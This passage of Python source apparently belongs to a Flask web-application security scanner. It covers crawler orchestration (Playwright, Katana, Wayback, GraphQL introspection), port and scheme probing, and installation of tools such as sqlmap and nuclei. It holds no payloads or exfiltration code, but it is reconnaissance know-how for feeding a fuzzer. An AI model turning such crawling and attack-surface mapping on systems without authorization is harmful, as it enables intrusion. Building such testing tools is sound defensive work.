    """Phase 2 Katana: static analysis of already-discovered JS file URLs.

    Runs katana at depth=0 (no crawling) against each .js file URL to extract
    endpoints embedded in bundled JavaScript (webpack, rollup, etc.) without
    re-crawling the whole site.

    Returns list of {url, method, source='katana', status=0, content_type='', title}
    """
    import shutil as _sh
    katana_bin = _sh.which("katana")
    if not katana_bin or not js_urls:
        return []

    results: list = []

    for js_url in js_urls[:100]:          # cap at 100 JS files
        if stop_event.is_set():
            break
        # Skip non-JS or data URIs
        path_lower = js_url.lower().split("?")[0]
        if not (path_lower.endswith(".js") or path_lower.endswith(".mjs")
                or path_lower.endswith(".ts") or "/js/" in path_lower):
            continue

        cmd = [
            katana_bin,
            "-u", js_url,
            "-d", "0",          # depth 0 — analyse this file only, don't follow links
            "-jc",              # parse JS
            "-jsl",             # JSLuice endpoint extraction
            "-timeout", "8",
            "-silent",
            "-jsonl",
            "-no-color",
        ]
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )
            fname = js_url.rstrip("/").split("/")[-1].split("?")[0][:30]
            _js_kill_timer = threading.Timer(30, proc.terminate)
            _js_kill_timer.start()
            try:
                for line in proc.stdout:  # type: ignore[union-attr]
                    if stop_event.is_set():
                        proc.terminate()
                        break
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        obj      = json.loads(line)
                        endpoint = obj.get("request", {}).get("endpoint") or obj.get("endpoint", "")
                        if endpoint:
                            results.append({
                                "url":          endpoint,
                                "method":       obj.get("request", {}).get("method", "GET"),
                                "source":       "katana",
                                "status":       0,
                                "content_type": "",
                                "title":        f"[JS:{fname}]",
                            })
                    except (json.JSONDecodeError, KeyError):
                        pass
            finally:
                _js_kill_timer.cancel()
            proc.wait(timeout=5)
        except Exception:
            pass

    return results


@app.route("/api/engine/ajax-crawl", methods=["POST"])
@_login_required
def ajax_crawl_start():
    """Start Advanced Crawler (Playwright AJAX + Katana). Body: {target, max_pages, max_depth}"""
    global _ajax_running, _ajax_stop_event, _ajax_thread

    if not _AJAX_SPIDER_AVAILABLE:
        return jsonify({
            "error": "Playwright not installed",
            "install": "pip install playwright && playwright install chromium"
        }), 503

    with _engine_lock:
        if _ajax_running:
            return jsonify({"error": "Ajax crawl already running"}), 409

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400

    # Auto-resolve scheme/port (http→https, alt-port detection)
    target = _resolve_target(target)

    _ajax_stop_event = threading.Event()
    _ajax_running    = True

    def _ajax_worker():
        """Unified Advanced Crawler — 5 parallel sources, shared dedup store.

        Sources:
          1. Playwright AJAX spider (multi-tab, with WebSocket capture)
          2. Katana static JS analysis subprocess
          3. Wayback Machine CDX harvest + httpx liveness probe
          4. robots.txt / sitemap.xml seed URLs
          5. GraphQL introspection (runs after crawlers finish)

        Pre-seeds from traditional spider (_engine_sitemap) if already run.
        """
        global _ajax_running, _ajax_urls_found, _ajax_pages, _ajax_status
        _ajax_status = "running"

        # Shared dedup state — all crawlers write here under _merge_lock
        _seen_urls: set  = set()
        _all_pages: list = []
        _merge_lock      = threading.Lock()

        def _add_pages(entries):
            """Merge new URL entries, skip duplicates by URL."""
            with _merge_lock:
                for e in entries:
                    url = (e.get("url") or "").strip()
                    if url and url not in _seen_urls:
                        _seen_urls.add(url)
                        _all_pages.append(e)

        # ── Pre-seed from Traditional Spider results (if already run) ─────────
        with _engine_lock:
            if _engine_sitemap is not None and _engine_sitemap.pages:
                for page_url, page_info in _engine_sitemap.pages.items():
                    ct  = page_info.get("content_type", "")
                    _add_pages([{
                        "url":          page_url,
                        "status":       page_info.get("status", 0),
                        "content_type": ct,
                        "source":       "traditional",
                        "title":        page_info.get("title", ""),
                    }])

        # ── Thread 1: Playwright AJAX spider (multi-tab + WebSocket) ──────────
        playwright_result = []

        def _run_playwright():
            try:
                scope   = ScopeManager(target)
                cookies = []
                if _engine_auth_handler:
                    cookies = [
                        {"name": c.name, "value": c.value,
                         "domain": urlparse(target).netloc, "path": "/"}
                        for c in _engine_auth_handler.session.cookies
                    ]
                spider = AjaxSpider(
                    target      = target,
                    scope       = scope,
                    max_pages   = data.get("max_pages", 50),
                    max_depth   = data.get("max_depth", 3),
                    headless    = data.get("headless", True),
                    cookies     = cookies,
                    stop_event  = _ajax_stop_event,
                    callback    = lambda u, s: None,
                    max_tabs    = 3,
                    # Sprint 3: pass login config for session refresh + form fill
                    auth_config = _login_config if _login_config.get("login_url") else {},
                    smart_fill  = True,
                )
                ajax_sitemap = spider.crawl()

                pages = []
                for page_url, page_info in ajax_sitemap.pages.items():
                    ct  = page_info.get("content_type", "")
                    if ct == "websocket":
                        src = "websocket"
                    elif ct == "xhr/network":
                        src = "network"
                    else:
                        src = "browser"
                    pages.append({
                        "url":          page_url,
                        "status":       page_info.get("status", 0),
                        "content_type": ct,
                        "source":       src,
                        "title":        page_info.get("title", ""),
                    })

                playwright_result.extend(pages)
                _add_pages(pages)

                # Merge into engine sitemap if a full scan has already run
                with _engine_lock:
                    if _engine_sitemap is not None:
                        for page_url, page_info in ajax_sitemap.pages.items():
                            _engine_sitemap.add_page(
                                page_info["url"], page_info["status"],
                                page_info["content_type"], page_info.get("headers", {}),
                                page_info.get("title", "")
                            )
                        for surf in ajax_sitemap.surfaces:
                            _engine_sitemap.add_surface(surf)
            except Exception:
                pass

        # ── Thread 2: Katana subprocess (full JS coverage) ────────────────────
        katana_result   = []
        katana_surfaces = []   # (endpoint, method, body, content_type) for InputSurface

        def _run_katana_thread():
            if not _KATANA_AVAILABLE:
                return
            extra_headers = []
            if _engine_auth_handler:
                try:
                    cookie_str = "; ".join(
                        f"{c.name}={c.value}"
                        for c in _engine_auth_handler.session.cookies
                    )
                    if cookie_str:
                        extra_headers.append(f"Cookie: {cookie_str}")
                except Exception:
                    pass

            entries, surfs = _run_katana(
                target,
                _ajax_stop_event,
                depth         = data.get("max_depth", 3),
                rate_limit    = 10,
                extra_headers = extra_headers if extra_headers else None,
                form_fill     = True,
                concurrency   = 10,
            )
            katana_result.extend(entries)
            katana_surfaces.extend(surfs)
            _add_pages(entries)

        # ── Thread 3: Wayback Machine harvest + liveness probe ───────────────
        wayback_result = []

        def _run_wayback_thread():
            raw_urls = _run_wayback(target, _ajax_stop_event)
            if not raw_urls or _ajax_stop_event.is_set():
                return
            with _merge_lock:
                unknown = [u for u in raw_urls if u not in _seen_urls]
            if not unknown or _ajax_stop_event.is_set():
                return
            live = _probe_liveness(unknown, _ajax_stop_event)
            wayback_result.extend(live)
            _add_pages(live)

        # ── Thread 4: robots.txt + sitemap.xml seed ───────────────────────────
        sitemap_result = []

        def _run_sitemap_thread():
            entries = _fetch_seed_urls(target, _ajax_stop_event)
            if not entries or _ajax_stop_event.is_set():
                return
            # Only keep URLs not already known
            new_entries = [e for e in entries if (e.get("url") or "") not in _seen_urls]
            sitemap_result.extend(new_entries)
            _add_pages(new_entries)

        # ── Run all four crawlers in parallel ─────────────────────────────────
        detail = ""
        try:
            t_pw = threading.Thread(target=_run_playwright,    daemon=True, name="adv-crawler-playwright")
            t_kt = threading.Thread(target=_run_katana_thread, daemon=True, name="adv-crawler-katana")
            t_wb = threading.Thread(target=_run_wayback_thread, daemon=True, name="adv-crawler-wayback")
            t_sm = threading.Thread(target=_run_sitemap_thread, daemon=True, name="adv-crawler-sitemap")
            t_pw.start(); t_kt.start(); t_wb.start(); t_sm.start()
            t_pw.join();  t_kt.join();  t_wb.join();  t_sm.join()

            # ── Post-crawl Phase A: Katana POST body → InputSurface objects ────────
            # Katana's -aff flag submits forms; the POST bodies reveal real params.
            # Convert those into InputSurface objects so the fuzzer can attack them.
            if katana_surfaces and not _ajax_stop_event.is_set():
                from urllib.parse import parse_qs as _pqs
                try:
                    from modules.crawler import InputSurface as _IS
                    with _engine_lock:
                        if _engine_sitemap is not None:
                            for ep, method, body, ct in katana_surfaces:
                                if "json" in ct:
                                    try:
                                        body_obj = json.loads(body)
                                        if isinstance(body_obj, dict):
                                            for k, v in list(body_obj.items())[:20]:
                                                _engine_sitemap.add_surface(_IS(
                                                    url=ep, method=method, param=k,
                                                    param_type="json", original_value=str(v),
                                                    content_type="application/json",
                                                ))
                                    except Exception:
                                        pass
                                else:
                                    for pair in body.split("&"):
                                        if "=" in pair:
                                            k, _, v = pair.partition("=")
                                            if k:
                                                _engine_sitemap.add_surface(_IS(
                                                    url=ep, method=method, param=k,
                                                    param_type="form", original_value=v,
                                                    content_type=ct or "application/x-www-form-urlencoded",
                                                ))
                except Exception:
                    pass

            # ── Post-crawl Phase B: Katana static JS analysis ─────────────────────
            # Extract .js URLs from all crawlers → run Katana depth-0 against each.
            # Finds endpoints buried in webpack bundles without re-crawling the site.
            if _KATANA_AVAILABLE and not _ajax_stop_event.is_set():
                with _merge_lock:
                    js_urls = [
                        p.get("url", "") for p in _all_pages
                        if p.get("url", "").lower().split("?")[0].endswith((".js", ".mjs"))
                        or "/js/" in p.get("url", "").lower()
                    ]
                if js_urls:
                    js_static_entries = _run_katana_js_static(js_urls, _ajax_stop_event)
                    if js_static_entries:
                        _add_pages(js_static_entries)
                        _log_activity("katana_js_static", target,
                                      f"JS static: {len(js_static_entries)} endpoints from {len(js_urls)} JS files")

            # ── Post-crawl Phase C: GraphQL introspection ─────────────────────────
            if not _ajax_stop_event.is_set():
                with _merge_lock:
                    discovered = [p.get("url", "") for p in _all_pages]
                gql_entries = _run_graphql_introspection(target, _ajax_stop_event, discovered)
                if gql_entries:
                    _add_pages(gql_entries)
                    for e in gql_entries:
                        _log_activity("graphql_found", e["url"], e.get("title", ""))

            # ── Persist merged results ────────────────────────────────────────────
            with _engine_lock:
                _ajax_pages      = list(_all_pages)
                _ajax_urls_found = len(_all_pages)

            # Build summary breakdown for activity log
            n_browser     = sum(1 for p in _all_pages if p.get("source") == "browser")
            n_network     = sum(1 for p in _all_pages if p.get("source") == "network")
            n_websocket   = sum(1 for p in _all_pages if p.get("source") == "websocket")
            n_katana      = sum(1 for p in _all_pages if p.get("source") == "katana")
            n_wayback     = sum(1 for p in _all_pages if p.get("source") == "wayback")
            n_sitemap     = sum(1 for p in _all_pages if p.get("source") in ("sitemap", "robots"))
            n_traditional = sum(1 for p in _all_pages if p.get("source") == "traditional")
            n_graphql     = sum(1 for p in _all_pages if p.get("source") == "graphql")
            n_form_submit = sum(1 for p in _all_pages if p.get("source") == "form_submit")
            detail = f"{len(_all_pages)} URLs total"
            parts  = []
            if n_browser + n_network + n_websocket:
                pw_count = n_browser + n_network + n_websocket
                parts.append(f"Playwright: {pw_count}")
            if n_katana:      parts.append(f"Katana: {n_katana}")
            if n_wayback:     parts.append(f"Wayback: {n_wayback}")
            if n_sitemap:     parts.append(f"Sitemap: {n_sitemap}")
            if n_traditional: parts.append(f"Traditional: {n_traditional}")
            if n_graphql:     parts.append(f"GraphQL: {n_graphql}")
            if n_form_submit: parts.append(f"Form-Submit: {n_form_submit}")
            if parts:         detail += f" ({', '.join(parts)})"
            _ajax_status = f"complete — {len(_all_pages)} urls"
        except Exception as e:
            log.error("[AJAX] worker unhandled exception: %s", e)
            _ajax_status = f"error: {e}"
        finally:
            with _engine_lock:
                _ajax_running = False
        _log_activity("ajax_done", target, detail)

    sources = ["Playwright (3-tab)", "Sitemap", "Wayback"]
    if _KATANA_AVAILABLE:
        sources.append("Katana")
    _log_activity("ajax_start", target, f"Starting: {', '.join(sources)}")
    _ajax_thread = threading.Thread(target=_ajax_worker, daemon=True, name="dast-adv-crawler")
    _ajax_thread.start()
    return jsonify({"success": True, "target": target,
                    "playwright": _AJAX_SPIDER_AVAILABLE,
                    "katana":     _KATANA_AVAILABLE,
                    "wayback":    True,
                    "sitemap":    True,
                    "graphql":    True,
                    "httpx":      _HTTPX_AVAILABLE})


@app.route("/api/engine/ajax-crawl/stop", methods=["POST"])
@_login_required
def ajax_crawl_stop():
    _ajax_stop_event.set()
    return jsonify({"success": True})


@app.route("/api/engine/ajax-crawl/status")
@_login_required
def ajax_crawl_status():
    with _engine_lock:
        running    = _ajax_running
        urls_found = _ajax_urls_found
        pages      = list(_ajax_pages)

    # Per-source breakdown
    breakdown = {
        "browser":      sum(1 for p in pages if p.get("source") == "browser"),
        "network":      sum(1 for p in pages if p.get("source") == "network"),
        "websocket":    sum(1 for p in pages if p.get("source") == "websocket"),
        "katana":       sum(1 for p in pages if p.get("source") == "katana"),
        "wayback":      sum(1 for p in pages if p.get("source") == "wayback"),
        "sitemap":      sum(1 for p in pages if p.get("source") in ("sitemap", "robots")),
        "traditional":  sum(1 for p in pages if p.get("source") == "traditional"),
        "graphql":      sum(1 for p in pages if p.get("source") == "graphql"),
        "form_submit":  sum(1 for p in pages if p.get("source") == "form_submit"),
    }
    return jsonify({
        "running":              running,
        "status":               _ajax_status,
        "urls_found":           urls_found,
        "playwright_available": _AJAX_SPIDER_AVAILABLE,
        "katana_available":     _KATANA_AVAILABLE,
        "httpx_available":      _HTTPX_AVAILABLE,
        "breakdown":            breakdown,
    })


@app.route("/api/engine/ajax-crawl/results")
@_login_required
def ajax_crawl_results():
    """Return all URLs discovered by the last AJAX crawl."""
    with _engine_lock:
        pages = list(_ajax_pages)
    return jsonify({"urls": pages, "count": len(pages)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  TARGET PROBE  (auto-discover working port/scheme)
# ═══════════════════════════════════════════════════════════════════════════════

def _probe_target(target: str) -> dict:
    """Check if target responds with a useful page; auto-corrects scheme/port.

    Detection order:
      1. Try target as-is.
      2. If HTTP 400 (server rejected plain HTTP), try https:// on same host:port.
      3. If connection failed entirely, probe common alt ports.
    Returns the best resolved URL and whether a correction was made.
    """
    import requests as _r
    from urllib.parse import urlparse as _up
    _s = _r.Session(); _s.verify = False
    _headers = {"User-Agent": "Mozilla/5.0 (DAST-Probe/1.0)", "Connection": "close"}

    _p    = _up(target)
    _host = _p.hostname or target
    _port = _p.port  # may be None
    _scheme = _p.scheme or "http"

    def _try(url: str) -> "_r.Response | None":
        try:
            return _s.get(url, timeout=10, headers=_headers, allow_redirects=True)
        except Exception:
            return None

    # 1. Try as-is
    _resp = _try(target)
    if _resp is not None:
        # HTTP 400 on a TLS port usually means wrong scheme → try https same host:port
        if _resp.status_code == 400 and _scheme == "http":
            _https = f"https://{_host}" + (f":{_port}" if _port else "")
            _r2 = _try(_https)
            if _r2 is not None and _r2.status_code != 400:
                return {"reachable": True, "original": target, "resolved": _https,
                        "status": _r2.status_code, "port_changed": True,
                        "note": "Switched http→https (server rejected plain HTTP)"}
        return {"reachable": True, "original": target, "resolved": target,
                "status": _resp.status_code, "port_changed": False}

    # 2. Connection failed — try https same port first (if currently http)
    if _scheme == "http" and _port:
        _https = f"https://{_host}:{_port}"
        _r2 = _try(_https)
        if _r2 is not None:
            return {"reachable": True, "original": target, "resolved": _https,
                    "status": _r2.status_code, "port_changed": True,
                    "note": "Switched http→https on same port"}

    # 3. Probe alt ports
    for _aport in [8443, 8080, 443, 8000, 3000, 9090, 9000, 5000, 4848]:
        if _aport == _port:
            continue
        _alt_scheme = "https" if _aport in (443, 8443) else _scheme
        _alt = f"{_alt_scheme}://{_host}:{_aport}"
        _r2 = _try(_alt)
        if _r2 is not None:
            return {"reachable": True, "original": target, "resolved": _alt,
                    "status": _r2.status_code, "port_changed": True}
    return {"reachable": False, "original": target, "resolved": target,
            "status": None, "port_changed": False}


def _resolve_target(target: str) -> str:
    """Return the best reachable URL for target (auto-upgrades scheme/port).
    Falls back to original if nothing responds — never blocks the caller.
    """
    try:
        result = _probe_target(target)
        return result.get("resolved") or target
    except Exception:
        return target


@app.route("/api/probe-target", methods=["POST"])
@_login_required
def probe_target_api():
    """Probe target reachability — auto-detects correct port if default fails."""
    data   = req.json or {}
    target = data.get("target", "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    result = _probe_target(target)
    return jsonify(result)


# ██  CAPABILITY STATUS  (single endpoint for UI feature detection)
# ═══════════════════════════════════════════════════════════════════════════════

def _assurance_executed_checks() -> list[str]:
    with _engine_lock:
        executed = list(_engine_progress.get("coverage_checks", []))
    if _passive_findings:
        executed.append("BROWSER-CLIENT-001")
    if _active_scan_id:
        executed.extend(["RESUME-STATE-001", "EVIDENCE-REPLAY-001"])
    return list(dict.fromkeys(executed))


@app.route("/api/assurance/coverage")
@_login_required
def assurance_coverage():
    executed = req.args.get("executed", "")
    executed_ids = [x.strip() for x in executed.split(",") if x.strip()] or _assurance_executed_checks()
    report = _ASSURANCE_REGISTRY.gap_report(executed_ids)
    report["checks"] = [check.to_dict() for check in _ASSURANCE_REGISTRY.list_checks()]
    return jsonify(report)


@app.route("/api/assurance/api-diff", methods=["POST"])
@_login_required
def assurance_api_diff():
    data = req.get_json(silent=True) or {}
    return jsonify(_API_EXPOSURE_DIFFER.compare(
        ui_fields=data.get("ui_fields", []),
        api_json=data.get("api_json", {}),
    ))


@app.route("/api/assurance/browser-security", methods=["POST"])
@_login_required
def assurance_browser_security():
    data = req.get_json(silent=True) or {}
    findings = _BROWSER_SECURITY_ANALYZER.analyze(
        url=data.get("url", _scan_target or ""),
        html=data.get("html", ""),
        headers=data.get("headers", {}),
    )
    return jsonify({"findings": findings, "finding_count": len(findings)})


@app.route("/api/assurance/oauth-oidc", methods=["POST"])
@_login_required
def assurance_oauth_oidc():
    data = req.get_json(silent=True) or {}
    findings = _OAUTH_ANALYZER.analyze_metadata(
        issuer=data.get("issuer", data.get("url", "")),
        metadata=data.get("metadata", {}),
        callback_url=data.get("callback_url", ""),
        webauthn_js=data.get("webauthn_js", ""),
    )
    return jsonify({"findings": findings, "finding_count": len(findings)})


@app.route("/api/assurance/journey/compare", methods=["POST"])
@_login_required
def assurance_journey_compare():
    data = req.get_json(silent=True) or {}
    steps = [
        JourneyStep(
            method=s.get("method", "GET"),
            url=s.get("url", ""),
            headers=s.get("headers", {}),
            body=s.get("body"),
            expected_status=s.get("expected_status"),
            name=s.get("name", ""),
        )
        for s in data.get("steps", [])
        if s.get("url")
    ]
    role_jsons = data.get("role_jsons", {})
    if not steps or not isinstance(role_jsons, dict):
        return jsonify({"error": "steps and role_jsons are required"}), 400

    class _StaticSession:
        def __init__(self, response_json):
            self.response_json = response_json

        def request(self, **kwargs):
            class _Resp:
                status_code = 200
                headers = {"content-type": "application/json"}
                url = kwargs.get("url", "")

                def __init__(self, body):
                    self._body = body
                    self.text = json.dumps(body)

                def json(self):
                    return self._body
            return _Resp(self.response_json)

    sessions = {role: _StaticSession(body) for role, body in role_jsons.items()}
    journey = Journey(data.get("name", "journey"), steps)
    return jsonify(_JOURNEY_SCANNER.compare_roles(journey, sessions))


@app.route("/api/assurance/resume", methods=["GET", "POST"])
@_login_required
def assurance_resume():
    if req.method == "GET":
        scan_id = req.args.get("scan_id") or _active_scan_id or ""
        return jsonify(_RESUMABLE_SCAN_STORE.load(scan_id) if scan_id else {})
    data = req.get_json(silent=True) or {}
    scan_id = data.get("scan_id") or _active_scan_id or str(uuid.uuid4())
    if data.get("action") == "mark_done":
        return jsonify(_RESUMABLE_SCAN_STORE.mark_done(scan_id, data.get("surface", "")))
    state = _RESUMABLE_SCAN_STORE.start_scan(
        scan_id,
        data.get("target", _scan_target or ""),
        data.get("surfaces", []),
    )
    return jsonify(state)


@app.route("/api/assurance/evidence-replay", methods=["POST"])
@_login_required
def assurance_evidence_replay():
    data = req.get_json(silent=True) or {}
    return jsonify(_EVIDENCE_REPLAY_BUILDER.build(data))


@app.route("/api/assurance/fp-lab", methods=["GET", "POST"])
@_login_required
def assurance_fp_lab():
    if req.method == "GET":
        return jsonify(_FALSE_POSITIVE_LAB.list_fixtures())
    data = req.get_json(silent=True) or {}
    try:
        return jsonify(_FALSE_POSITIVE_LAB.score(
            data.get("fixture", "basic-web"),
            data.get("findings", []),
        ))
    except KeyError as exc:
        return jsonify({"error": str(exc)}), 404


_REQUIREMENTS_FILE = Path(__file__).resolve().with_name("requirements.txt")
_PYTHON_REQUIREMENT_MODULES = {
    "psycopg2-binary": "psycopg2",
    "pyyaml": "yaml",
    "httpx": "httpx",
    "grpcio": "grpc",
    "grpcio-reflection": "grpc_reflection",
    "protobuf": "google.protobuf",
    "flask": "flask",
    "gunicorn": "gunicorn",
    "requests": "requests",
    "urllib3": "urllib3",
    "redis": "redis",
    "certifi": "certifi",
    "cryptography": "cryptography",
    "playwright": "playwright",
}
_EXTERNAL_REQUIREMENTS = [
    {"id": "tool-sqlmap", "name": "sqlmap", "binary": "sqlmap", "category": "External scanner", "required": False,
     "note": "Deep SQL injection validation"},
    {"id": "tool-nuclei", "name": "nuclei", "binary": "nuclei", "category": "External scanner", "required": False,
     "note": "Community vulnerability templates"},
    {"id": "tool-nmap", "name": "nmap", "binary": "nmap", "category": "External scanner", "required": False,
     "note": "Port/service enumeration"},
    {"id": "tool-gobuster", "name": "gobuster", "binary": "gobuster", "category": "External scanner", "required": False,
     "note": "Directory and file brute forcing"},
    {"id": "tool-katana", "name": "katana", "binary": "katana", "category": "Crawler", "required": False,
     "note": "JS-aware crawling and endpoint extraction"},
    {"id": "tool-httpx", "name": "httpx", "binary": "httpx", "category": "Crawler", "required": False,
     "note": "Fast liveness probing"},
    {"id": "tool-fabric", "name": "fabric", "binary": "fabric", "category": "AI helper", "required": False,
     "note": "Optional finding/report analysis patterns"},
    {"id": "tool-node", "name": "node", "binary": "node", "category": "Runtime", "required": False,
     "note": "JavaScript hooks and tooling"},
    {"id": "tool-groovy", "name": "groovy", "binary": "groovy", "category": "Runtime", "required": False,
     "note": "Groovy hooks"},
    {"id": "tool-redis-server", "name": "redis-server", "binary": "redis-server", "category": "Performance", "required": False,
     "note": "Optional Redis cache/server; REDIS_URL still needs configuration"},
    {"id": "python-mitmproxy", "name": "mitmproxy", "module": "mitmproxy", "category": "Python package", "required": False,
     "note": "Optional proxy engine package"},
]
_requirements_install_lock = threading.Lock()
_requirements_install_state = {
    "running": False,
    "started_at": None,
    "finished_at": None,
    "success": None,
    "commands": [],
    "item_ids": [],
    "log": [],
}


def _module_available(module: str) -> bool:
    try:
        return importlib.util.find_spec(module) is not None
    except (ImportError, AttributeError, ValueError):
        return False


def _binary_available(binary: str) -> bool:
    if binary == "node":
        return bool(_shutil_top.which("node") or _shutil_top.which("nodejs"))
    return bool(_shutil_top.which(binary))


def _parse_python_requirements() -> list[dict]:
    items: list[dict] = []
    if not _REQUIREMENTS_FILE.exists():
        return items
    for raw in _REQUIREMENTS_FILE.read_text(encoding="utf-8").splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line or line.startswith(("-", "git+", "http://", "https://")):
            continue
        package = re.split(r"[<>=!~;]", line, maxsplit=1)[0].strip()
        base = re.sub(r"\[.*\]", "", package).strip().lower()
        if not base:
            continue
        module = _PYTHON_REQUIREMENT_MODULES.get(base, base.replace("-", "_"))
        items.append({
            "id": f"python-{base.replace('_', '-')}",
            "name": package,
            "module": module,
            "category": "Python package",
            "required": True,
            "note": "Installed from requirements.txt",
        })
    return items


def _format_install_command(cmd: list[str]) -> str:
    return " ".join(shlex.quote(str(part)) for part in cmd)


def _package_manager_command(package: str, winget_id: str | None = None) -> list[str] | None:
    if _shutil_top.which("choco"):
        return ["choco", "install", package, "-y"]
    if _shutil_top.which("winget") and winget_id:
        return ["winget", "install", "-e", "--id", winget_id,
                "--accept-source-agreements", "--accept-package-agreements"]
    if _shutil_top.which("brew"):
        return ["brew", "install", package]
    if _shutil_top.which("apt-get"):
        sudo = _shutil_top.which("sudo")
        return ([sudo] if sudo else []) + ["apt-get", "install", "-y", package]
    return None


def _install_commands_for_requirement(item: dict) -> list[list[str]]:
    item_id = item.get("id", "")
    if item_id.startswith("python-"):
        if item_id == "python-mitmproxy":
            return [[sys.executable, "-m", "pip", "install", "mitmproxy"]]
        commands = [[sys.executable, "-m", "pip", "install", "-r", str(_REQUIREMENTS_FILE)]]
        if item_id == "python-playwright":
            commands.append([sys.executable, "-m", "playwright", "install", "chromium"])
        return commands

    go_bin = _shutil_top.which("go")
    go_packages = {
        "tool-nuclei": "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        "tool-katana": "github.com/projectdiscovery/katana/cmd/katana@latest",
        "tool-httpx": "github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "tool-gobuster": "github.com/OJ/gobuster/v3@latest",
        "tool-fabric": "github.com/danielmiessler/fabric@latest",
    }
    if item_id in go_packages and go_bin:
        return [[go_bin, "install", go_packages[item_id]]]

    if item_id == "tool-sqlmap":
        return [[sys.executable, "-m", "pip", "install", "sqlmap"]]
    if item_id == "tool-nmap":
        cmd = _package_manager_command("nmap", "Insecure.Nmap")
        return [cmd] if cmd else []
    if item_id == "tool-node":
        cmd = _package_manager_command("nodejs", "OpenJS.NodeJS.LTS")
        return [cmd] if cmd else []
    if item_id == "tool-groovy":
        cmd = _package_manager_command("groovy", "Apache.Groovy.4")
        return [cmd] if cmd else []
    if item_id == "tool-redis-server":
        cmd = _package_manager_command("redis-server", "Redis.Redis")
        return [cmd] if cmd else []
    return []


def _requirements_status_items() -> list[dict]:
    specs = _parse_python_requirements() + list(_EXTERNAL_REQUIREMENTS)
    items: list[dict] = []
    for spec in specs:
        spec = dict(spec)
        if "module" in spec:
            available = _module_available(spec["module"])
        else:
            available = _binary_available(spec.get("binary", spec["name"]))
        commands = [] if available else _install_commands_for_requirement(spec)
        spec.update({
            "available": available,
            "installable": bool(commands),
            "install_commands": commands,
            "install_command": " && ".join(_format_install_command(cmd) for cmd in commands),
        })
        if not commands and not available:
            spec["install_command"] = _manual_install_hint(spec)
        items.append(spec)
    return items


def _manual_install_hint(item: dict) -> str:
    item_id = item.get("id", "")
    if item_id in {"tool-nuclei", "tool-katana", "tool-httpx", "tool-gobuster", "tool-fabric"}:
        return "Install Go, then use the recommended go install command for this tool."
    if item_id == "tool-nmap":
        return "Install nmap with your OS package manager, then restart or refresh PATH."
    if item_id == "tool-redis-server":
        return "Install Redis server and set REDIS_URL if you want Redis-backed cache/context."
    return "Install manually, then refresh this list."


def _requirements_install_plan(items: list[dict]) -> tuple[list[list[str]], list[dict]]:
    missing = [item for item in items if not item.get("available") and item.get("installable")]
    commands: list[list[str]] = []
    seen: set[tuple[str, ...]] = set()
    for item in missing:
        for cmd in item.get("install_commands", []):
            key = tuple(str(part) for part in cmd)
            if key in seen:
                continue
            seen.add(key)
            commands.append(list(key))
    return commands, missing


def _install_state_snapshot() -> dict:
    with _requirements_install_lock:
        return json.loads(json.dumps(_requirements_install_state))


def _append_install_log(line: str) -> None:
    with _requirements_install_lock:
        log_lines = _requirements_install_state.setdefault("log", [])
        log_lines.append(line)
        if len(log_lines) > 200:
            del log_lines[:-200]


def _run_requirements_install(commands: list[list[str]], item_ids: list[str]) -> None:
    with _requirements_install_lock:
        _requirements_install_state.update({
            "running": True,
            "started_at": datetime.now(timezone.utc).isoformat(),
            "finished_at": None,
            "success": None,
            "commands": [_format_install_command(cmd) for cmd in commands],
            "item_ids": item_ids,
            "log": [],
        })

    success = True
    for cmd in commands:
        _append_install_log("$ " + _format_install_command(cmd))
        try:
            proc = subprocess.run(
                cmd,
                cwd=str(Path(__file__).resolve().parent),
                text=True,
                capture_output=True,
                timeout=1800,
            )
            output = ((proc.stdout or "") + "\n" + (proc.stderr or "")).strip()
            if output:
                tail = "\n".join(output.splitlines()[-40:])
                _append_install_log(tail)
            _append_install_log(f"[exit {proc.returncode}]")
            if proc.returncode != 0:
                success = False
        except Exception as exc:
            success = False
            _append_install_log(f"[error] {exc}")

    with _requirements_install_lock:
        _requirements_install_state.update({
            "running": False,
            "finished_at": datetime.now(timezone.utc).isoformat(),
            "success": success,
        })


@app.route("/api/requirements/status")
@_login_required
def requirements_status():
    items = _requirements_status_items()
    missing = [item for item in items if not item.get("available")]
    installable_missing = [item for item in missing if item.get("installable")]
    return jsonify({
        "items": items,
        "missing": missing,
        "missing_count": len(missing),
        "installable_missing_count": len(installable_missing),
        "python_executable": sys.executable,
        "project_root": str(Path(__file__).resolve().parent),
        "install": _install_state_snapshot(),
    })


@app.route("/api/requirements/install", methods=["POST"])
@_login_required
def requirements_install():
    data = req.get_json(silent=True) or {}
    dry_run = bool(data.get("dry_run"))
    items = _requirements_status_items()
    commands, targets = _requirements_install_plan(items)
    formatted = [_format_install_command(cmd) for cmd in commands]

    if dry_run:
        return jsonify({
            "status": "dry_run",
            "commands": formatted,
            "command_count": len(commands),
            "items": [item["id"] for item in targets],
        })

    if _install_state_snapshot().get("running"):
        return jsonify({"error": "requirements install already running",
                        "install": _install_state_snapshot()}), 409

    if not commands:
        return jsonify({
            "status": "nothing_to_install",
            "commands": [],
            "command_count": 0,
            "install": _install_state_snapshot(),
        })

    threading.Thread(
        target=_run_requirements_install,
        args=(commands, [item["id"] for item in targets]),
        daemon=True,
        name="requirements-install",
    ).start()
    return jsonify({
        "status": "started",
        "commands": formatted,
        "command_count": len(commands),
        "items": [item["id"] for item in targets],
        "install": _install_state_snapshot(),
    })


@app.route("/api/capabilities")
@_login_required
def capabilities():
    with _engine_lock:
        eng_running = _engine_running
        eng_status  = _engine_status_msg
        eng_progress = dict(_engine_progress)

    return jsonify({
        "proxy":      {"available": PROXY_AVAILABLE, "running": bool(_proxy_thread and _proxy_thread.is_alive()), "port": _proxy_port},
        "playwright": {"available": PLAYWRIGHT_AVAILABLE},
        "hooks":      {
            "loaded":   sum(len(v) for v in _hooks.values()),
            "runtimes": {
                "python":     True,
                "javascript": _NODE_AVAILABLE,
                "groovy":     _GROOVY_AVAILABLE,
            },
        },
        "agents":     {"total": len(_DAST_AGENTS), "enabled": sum(1 for c in _agent_config.values() if c["enabled"])},
        "site_map":   {"urls": len(_site_map)},
